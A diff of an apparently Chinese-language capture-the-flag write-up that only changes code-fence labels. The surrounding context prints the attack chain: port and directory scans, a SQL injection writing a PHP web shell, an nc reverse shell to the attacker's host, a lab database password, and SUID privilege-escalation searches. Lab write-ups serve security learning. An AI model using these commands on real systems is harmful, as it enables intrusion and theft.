@@ -16,7 +16,7 @@ tags:
 
 扫描所执行的命令，执行结果如下
 
-```
+```bash
 sudo nmap -sn 10.10.10.0/24
 
 sudo nmap --min-rate 10000 -p- 10.10.10.31   
@@ -32,7 +32,7 @@ sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31
 
 在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破
 
-```
+```bash
 sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
 ```
 
@@ -58,7 +58,7 @@ sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
 
 kali 架设连接
 
-```
+```bash
 python3 -m http.server 80
 ```
 
@@ -70,7 +70,7 @@ python3 -m http.server 80
 
 注入 sql 反弹 shell
 
-```
+```shell
 SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php'
 ```
 
@@ -82,13 +82,13 @@ http://10.10.10.33/shell.php?cmd=pwd
 
 连接 shell ，因为防火墙墙掉了不常见端口，因此使用 443 端口
 
-```
+```shell
 nc -e /bin/bash 10.10.10.5 4444
 ```
 
 以下是提权一阶段代码
 
-```
+```shell
 cat /etc/passwd |grep "/bin/bash"
 
 cd settings
@@ -100,7 +100,7 @@ cat config.php
 
 ![iii](content/posts/Credit%20Card%20Scammers%20Writeup/iii.png)
 
-```
+```shell
 mysql -uorders -pOb2UA15ubBtzpZrvdMYT orders -e 'SELECT * from users;' 
 ```
 
@@ -116,7 +116,7 @@ ssh 登入
 
 二阶段提权
 
-```
+```shell
 find / -perm -u=s -type f 2>/dev/null
 
 ls
